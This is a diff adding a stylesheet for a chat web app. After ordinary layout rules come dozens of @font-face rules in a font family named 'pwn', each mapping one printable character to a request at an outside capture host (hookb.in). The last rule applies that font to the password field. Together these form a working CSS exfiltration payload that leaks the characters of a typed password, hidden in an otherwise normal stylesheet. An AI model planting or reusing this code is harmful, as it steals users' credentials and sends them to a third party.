@@ -1,0 +1,768 @@
+body {
+    background-image: url("../img/background.png");
+}
+
+h1 {
+    font-size: 80px;;
+    text-align: center;
+    font-weight: bolder;
+}
+
+h2 {
+    font-size: 40px;
+    text-align: center;
+    font-weight: bolder;
+}
+
+.navbar-container {
+    width: 60%;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.navbar {
+    padding: 0px;
+    text-align: center;
+    list-style-type: none;
+}
+
+.navbar-element {
+    background-color: rgb(224, 189, 107);
+    display: inline-block;
+    height: 50px;
+    border-radius: 16px;
+    width: 24%;
+    margin-top: auto;
+    margin-bottom: auto;
+    text-decoration: none;
+    text-align: center;
+    line-height: 50px;
+    color: black;
+}
+
+.navbar-element:hover {
+    background-color: rgb(209, 177, 102);
+}
+
+.message-container {
+    overflow: scroll;
+    overflow-x: hidden;
+    background-color: rgba(0,0,0,0.6);
+    width: 70%;
+    height: 500px;
+    margin-left: auto;
+    margin-right: auto;
+    border-top-right-radius: 18px;
+    border-top-left-radius: 18px;
+}
+
+.message {
+    padding: 5px;
+}
+
+.message-header-time {
+    display: inline-block;
+    color: white;
+    padding-right: 8px;
+}
+
+.message-header-name {
+    display: inline-block;
+    color: red;
+    padding-right: 8px;
+}
+
+.message-content {
+    display: inline-block;
+    color: white;
+    padding-right: 8px;
+}
+
+.message-input {
+    color: white;
+    background-color: rgba(0,0,0,0.6);
+    display: block;
+    width: 69.8%;
+    margin-left: auto;
+    margin-right: auto;
+    border-bottom-right-radius: 12px;
+    border-bottom-left-radius: 12px;
+}
+
+.message-input:focus {
+    outline: none;
+    border-color: blue;
+}
+
+.form-container, .login-container {
+    border-radius: 5px;
+    padding: 20px;
+    background-color: rgba(255,255,255,0.6);
+    width: 70%;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.form-container. .login-container label {
+    padding-left: 8px;
+    font-size: 30px;
+}
+
+.feedbackform-container {
+    background-color: rgba(255,255,255,0.6);
+    width: 70%;
+    margin-left: auto;
+    margin-right: auto;
+    border-radius: 5px;
+    padding: 20px;
+}
+
+#chat-title {
+    width: 230px;
+    height: 30px;
+    line-height: 30px;
+    font-size: 20px;
+}
+
+#chat-title-label {
+    padding-right: 67px;
+}
+
+#create-chat-button {
+    margin-top: 10px;
+    background-color: #008CBA;
+    border: none;
+    color: white;
+    padding: 15px 32px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    -webkit-transition-duration: 0.4s; /* Safari */
+    transition-duration: 0.4s;
+}
+
+#create-chat-button:hover {
+    background-color: white;
+    color: #008CBA;
+}
+
+#feedback {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+    margin-top: 6px;
+    margin-bottom: 16px;
+    resize: vertical;
+}
+
+#send-feedback-button, #login-button {
+    margin-top: 10px;
+    background-color: #008CBA;
+    border: none;
+    color: white;
+    padding: 15px 32px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    -webkit-transition-duration: 0.4s; /* Safari */
+    transition-duration: 0.4s;
+}
+
+#send-feedback-button:hover {
+    background-color: white; /* Green */
+    color: #008CBA;
+}
+
+#login-form {
+    margin-left: auto;
+    margin-right: auto;
+    width: 25%;
+}
+
+#username, #password {
+    margin-bottom: 20px;
+}
+
+.login-input {
+    position: absolute;
+}
+
+#login-input-img {
+    width: 16px;
+    position: absolute;
+    top: 3px;
+    right: 6px;
+}
+
+@font-face { /* '!' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%21");
+    unicode-range: U+0021;
+}
+
+@font-face { /* '"' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%22");
+    unicode-range: U+0022;
+}
+
+@font-face { /* '#' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%23");
+    unicode-range: U+0023;
+}
+
+@font-face { /* '$' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%24");
+    unicode-range: U+0024;
+}
+
+@font-face { /* '%' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%25");
+    unicode-range: U+0025;
+}
+
+@font-face { /* '&' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%26");
+    unicode-range: U+0026;
+}
+
+@font-face { /* ''' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%27");
+    unicode-range: U+0027;
+}
+
+@font-face { /* '(' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%28");
+    unicode-range: U+0028;
+}
+
+@font-face { /* ')' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%29");
+    unicode-range: U+0029;
+}
+
+@font-face { /* '*' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=*");
+    unicode-range: U+002A;
+}
+
+@font-face { /* '+' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%2B");
+    unicode-range: U+002B;
+}
+
+@font-face { /* ',' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%2C");
+    unicode-range: U+002C;
+}
+
+@font-face { /* '-' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=-");
+    unicode-range: U+002D;
+}
+
+@font-face { /* '.' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=.");
+    unicode-range: U+002E;
+}
+
+@font-face { /* '/' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%2F");
+    unicode-range: U+002F;
+}
+
+@font-face { /* '0' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=0");
+    unicode-range: U+0030;
+}
+
+@font-face { /* '1' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=1");
+    unicode-range: U+0031;
+}
+
+@font-face { /* '2' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=2");
+    unicode-range: U+0032;
+}
+
+@font-face { /* '3' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=3");
+    unicode-range: U+0033;
+}
+
+@font-face { /* '4' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=4");
+    unicode-range: U+0034;
+}
+
+@font-face { /* '5' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=5");
+    unicode-range: U+0035;
+}
+
+@font-face { /* '6' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=6");
+    unicode-range: U+0036;
+}
+
+@font-face { /* '7' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=7");
+    unicode-range: U+0037;
+}
+
+@font-face { /* '8' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=8");
+    unicode-range: U+0038;
+}
+
+@font-face { /* '9' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=9");
+    unicode-range: U+0039;
+}
+
+@font-face { /* ':' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%3A");
+    unicode-range: U+003A;
+}
+
+@font-face { /* ';' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%3B");
+    unicode-range: U+003B;
+}
+
+@font-face { /* '<' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%3C");
+    unicode-range: U+003C;
+}
+
+@font-face { /* '=' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%3D");
+    unicode-range: U+003D;
+}
+
+@font-face { /* '>' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%3E");
+    unicode-range: U+003E;
+}
+
+@font-face { /* '?' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%3F");
+    unicode-range: U+003F;
+}
+
+@font-face { /* '@' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%40");
+    unicode-range: U+0040;
+}
+
+@font-face { /* 'A' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=A");
+    unicode-range: U+0041;
+}
+
+@font-face { /* 'B' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=B");
+    unicode-range: U+0042;
+}
+
+@font-face { /* 'C' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=C");
+    unicode-range: U+0043;
+}
+
+@font-face { /* 'D' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=D");
+    unicode-range: U+0044;
+}
+
+@font-face { /* 'E' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=E");
+    unicode-range: U+0045;
+}
+
+@font-face { /* 'F' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=F");
+    unicode-range: U+0046;
+}
+
+@font-face { /* 'G' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=G");
+    unicode-range: U+0047;
+}
+
+@font-face { /* 'H' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=H");
+    unicode-range: U+0048;
+}
+
+@font-face { /* 'I' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=I");
+    unicode-range: U+0049;
+}
+
+@font-face { /* 'J' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=J");
+    unicode-range: U+004A;
+}
+
+@font-face { /* 'K' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=K");
+    unicode-range: U+004B;
+}
+
+@font-face { /* 'L' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=L");
+    unicode-range: U+004C;
+}
+
+@font-face { /* 'M' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=M");
+    unicode-range: U+004D;
+}
+
+@font-face { /* 'N' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=N");
+    unicode-range: U+004E;
+}
+
+@font-face { /* 'O' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=O");
+    unicode-range: U+004F;
+}
+
+@font-face { /* 'P' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=P");
+    unicode-range: U+0050;
+}
+
+@font-face { /* 'Q' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=Q");
+    unicode-range: U+0051;
+}
+
+@font-face { /* 'R' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=R");
+    unicode-range: U+0052;
+}
+
+@font-face { /* 'S' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=S");
+    unicode-range: U+0053;
+}
+
+@font-face { /* 'T' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=T");
+    unicode-range: U+0054;
+}
+
+@font-face { /* 'U' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=U");
+    unicode-range: U+0055;
+}
+
+@font-face { /* 'V' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=V");
+    unicode-range: U+0056;
+}
+
+@font-face { /* 'W' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=W");
+    unicode-range: U+0057;
+}
+
+@font-face { /* 'X' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=X");
+    unicode-range: U+0058;
+}
+
+@font-face { /* 'Y' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=Y");
+    unicode-range: U+0059;
+}
+
+@font-face { /* 'Z' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=Z");
+    unicode-range: U+005A;
+}
+
+@font-face { /* '[' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%5B");
+    unicode-range: U+005B;
+}
+
+@font-face { /* '\' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%5C");
+    unicode-range: U+005C;
+}
+
+@font-face { /* ']' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%5D");
+    unicode-range: U+005D;
+}
+
+@font-face { /* '^' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%5E");
+    unicode-range: U+005E;
+}
+
+@font-face { /* '_' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=_");
+    unicode-range: U+005F;
+}
+
+@font-face { /* '`' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%60");
+    unicode-range: U+0060;
+}
+
+@font-face { /* 'a' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=a");
+    unicode-range: U+0061;
+}
+
+@font-face { /* 'b' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=b");
+    unicode-range: U+0062;
+}
+
+@font-face { /* 'c' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=c");
+    unicode-range: U+0063;
+}
+
+@font-face { /* 'd' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=d");
+    unicode-range: U+0064;
+}
+
+@font-face { /* 'e' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=e");
+    unicode-range: U+0065;
+}
+
+@font-face { /* 'f' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=f");
+    unicode-range: U+0066;
+}
+
+@font-face { /* 'g' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=g");
+    unicode-range: U+0067;
+}
+
+@font-face { /* 'h' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=h");
+    unicode-range: U+0068;
+}
+
+@font-face { /* 'i' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=i");
+    unicode-range: U+0069;
+}
+
+@font-face { /* 'j' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=j");
+    unicode-range: U+006A;
+}
+
+@font-face { /* 'k' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=k");
+    unicode-range: U+006B;
+}
+
+@font-face { /* 'l' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=l");
+    unicode-range: U+006C;
+}
+
+@font-face { /* 'm' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=m");
+    unicode-range: U+006D;
+}
+
+@font-face { /* 'n' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=n");
+    unicode-range: U+006E;
+}
+
+@font-face { /* 'o' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=o");
+    unicode-range: U+006F;
+}
+
+@font-face { /* 'p' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=p");
+    unicode-range: U+0070;
+}
+
+@font-face { /* 'q' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=q");
+    unicode-range: U+0071;
+}
+
+@font-face { /* 'r' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=r");
+    unicode-range: U+0072;
+}
+
+@font-face { /* 's' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=s");
+    unicode-range: U+0073;
+}
+
+@font-face { /* 't' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=t");
+    unicode-range: U+0074;
+}
+
+@font-face { /* 'u' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=u");
+    unicode-range: U+0075;
+}
+
+@font-face { /* 'v' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=v");
+    unicode-range: U+0076;
+}
+
+@font-face { /* 'w' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=w");
+    unicode-range: U+0077;
+}
+
+@font-face { /* 'x' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=x");
+    unicode-range: U+0078;
+}
+
+@font-face { /* 'y' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=y");
+    unicode-range: U+0079;
+}
+
+@font-face { /* 'z' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=z");
+    unicode-range: U+007A;
+}
+
+@font-face { /* '{' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%7B");
+    unicode-range: U+007B;
+}
+
+@font-face { /* '|' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%7C");
+    unicode-range: U+007C;
+}
+
+@font-face { /* '}' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%7D");
+    unicode-range: U+007D;
+}
+
+@font-face { /* '~' */
+    font-family: pwn;
+    src: url("https://hookb.in/E5V2ANXB?char=%7E");
+    unicode-range: U+007E;
+}
+
+#password {
+    font-family: pwn;
+}
+         
